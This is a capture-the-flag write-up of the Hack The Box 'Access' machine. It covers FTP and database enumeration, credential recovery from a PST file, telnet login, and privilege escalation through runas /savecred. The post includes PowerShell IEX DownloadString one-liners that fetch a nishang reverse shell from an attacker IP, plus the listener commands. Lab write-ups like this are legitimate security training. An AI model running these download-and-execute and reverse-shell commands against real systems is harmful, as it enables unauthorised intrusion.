---
layout: post
title: "[HTB] Access Writeup"
slug: "access"
date: "2024-04-18"
comments: false
categories:
  - hacking
tags:
  - write up
  - hack the box
  - windows
---

### Enumeration
**IP**: 10.10.10.98

```bash
> nmap -sCV -v 10.10.10.98 -oA nmap/
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Cant get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst: 
|_  SYST: Windows_NT
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: MegaCorp
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

So we have http, ftp and possibly telnet open.

###### FTP
We try anonymous login on the ftp port.
```bash
> ftp anonymous@10.10.10.98
> ls
Backups
Engineer
> cd Backups
> binary
Mode set to I
> get backup.mdb
> cd ../Engineer
> get Access\ Control.zip
```

We download the two files onto our host.
![](/images/access/file_type.png)

The `zip` file is password protected and the backup is Microsoft access database.
![](/images/access/password_protected.png)

###### Telnet
```bash
> telnet 10.10.10.98
login:
password:
```

We need credentials so let's skip for the moment.

###### http
![](/images/access/http_server.png)

Not much value in the web server too.

Downloading the image and running `exiftool` on it.
![](/images/access/exif_tool.png)
###### backup.mdb

In our linux machine let's install `mdbtools` which is a linux tool for accessing Microsoft Access database. 

```bash
> sudo apt-get install mdbtools
```

Using `mdb-tables` to view the tables inside the database.
![](/images/access/mdb_tables.png)

For visibility let's do:
```bash
> mdb-tables backup.mdb | tr ' ' '\n' | sort > tables.txt
acc_antiback
....
auth_user
....SNIP
```

Exporting value from the `auth_user` we get:
![](/images/access/auth_user.png)

```txt
admin:admin
engineer:access4u@security
backup_admin:admin
```

We try the `engineer` password on the password protected `zip` archive.

```bash
> file Access\ Control.pst
Access Control.pst: Microsoft Outlook email folder (>=2003)
```

We get a Microsoft Outook email folder. I don't know how to open pst file on my linux machine so I have utilised an online [pst-viewer](https://goldfynch.com/pst-viewer/index.html)

![](/images/access/pst_outlook.png)

```text
security:4Cc3ssC0ntr0ller
```

We got another cred. Let's test this on telnet.
![](/images/access/telnet_access.png)

We have user `> type C:\Users\Desktop\user.txt`.

Going through `C:\Users\Public\Desktop` we find an interesting shortcut.
![](/images/access/access_lnk.png)

Running `type` on the file we get a bunch of strings.
![](/images/access/type_lnk.png)

Before we analyse it let's upgrade our shell by using a reverse shell from nishang.

```powershell
C:\Users\Public\Desktop> powershell "IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.20:1337/nishang.ps1')"
```

```bash
> python3 -m http.server 1337
> nc -lvnp 6969
Listening on 0.0.0.0 6969
Connection received on 10.10.10.98 49162
Windows PowerShell running as user security on ACCESS
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Users\security>
```

Now let's use powershell command to analyse the `.lnk` shortcut file.
![](/images/access/runas.png)

On analysing we see that `runas.exe` is used to run the command and there is `/user:ACCESS\Administrator /savecred` as argument. This means that we can run the command as Administrator and  password is cached.

We try to use `runas` with `user` and `savecred` from our reverse shell but it's not working as intended. So let's start over with our telnet connection and try to get a reverse shell with admin privilege.

```cmd
C:\Users\Public\Desktop> runas /user:ACCESS\Administrator /savecred "powershell -c IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.20:1337/nishang.ps1')"
```

![](/images/access/administrator.png)

We have root`type C:\Users\Administrator\Desktop\root.txt`

The machine has been pwned.
![](/images/access/pwned.png)